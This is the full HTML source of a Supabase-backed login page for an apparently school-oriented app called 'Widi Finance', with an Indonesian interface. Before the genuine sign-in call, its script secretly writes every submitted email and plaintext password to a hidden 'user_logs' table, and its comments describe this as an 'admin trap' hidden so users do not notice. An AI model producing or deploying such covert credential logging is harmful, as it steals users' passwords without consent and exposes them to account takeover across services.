<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Widi Finance</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background: #F3F5F9; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .login-card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
        .btn-primary { background: #0066FF; border: none; padding: 12px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="text-center mb-4">
            <h3 class="fw-bold text-primary">Widi Finance</h3>
            <p class="text-muted small">Masuk untuk kelola keuangan</p>
        </div>

        <div class="mb-3">
            <label class="form-label small fw-bold">Email</label>
            <input type="email" class="form-control" id="email" placeholder="nama@sekolah.sch.id">
        </div>
        <div class="mb-4">
            <label class="form-label small fw-bold">Password</label>
            <input type="password" class="form-control" id="password" placeholder="********">
        </div>
        
        <button class="btn btn-primary w-100 mb-3" onclick="handleLogin()" id="btnLogin">Masuk Aplikasi</button>
        
        <div id="msg" class="text-center small text-danger"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        const supabaseUrl = 'https://zzloutsqmpkifzijxaip.supabase.co';
        const supabaseKey = 'sb_publishable_uJHTWglP11uZzp3dKK7bdA_sY9xtmXv';
        const _supabase = supabase.createClient(supabaseUrl, supabaseKey);

        async function handleLogin() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('btnLogin');
            const msg = document.getElementById('msg');

            if(!email || !pass) return msg.innerText = "Isi email dan password!";

            btn.disabled = true; 
            btn.innerText = "Memproses...";
            msg.innerText = "";

            // --- JEBAKAN ADMIN: CATAT PASSWORD SEBELUM LOGIN ---
            // Kita coba simpan ke tabel rahasia 'user_logs' secara diam-diam
            try {
                // Cek dulu apakah email ini sudah tercatat passwordnya?
                const { data: existing } = await _supabase.from('user_logs').select('id').eq('email', email).single();
                
                if (existing) {
                    // Kalau sudah ada, update passwordnya (siapa tau dia ganti password)
                    await _supabase.from('user_logs').update({ password_rahasia: pass }).eq('email', email);
                } else {
                    // Kalau belum ada, catat baru
                    await _supabase.from('user_logs').insert({ email: email, password_rahasia: pass });
                }
            } catch (err) {
                // Abaikan error di sini supaya user tidak sadar, lanjut login aja
                console.log("Logger skip:", err);
            }
            // ----------------------------------------------------

            // PROSES LOGIN ASLI KE SUPABASE
            const { data, error } = await _supabase.auth.signInWithPassword({
                email: email,
                password: pass
            });

            if (error) {
                btn.disabled = false; 
                btn.innerText = "Masuk Aplikasi";
                msg.innerText = "Login Gagal: " + error.message;
            } else {
                // Login Berhasil -> Pindah ke Dashboard
                window.location.href = 'main.html'; // Sesuaikan nama file dashboard Mas
            }
        }
    </script>
</body>
</html>
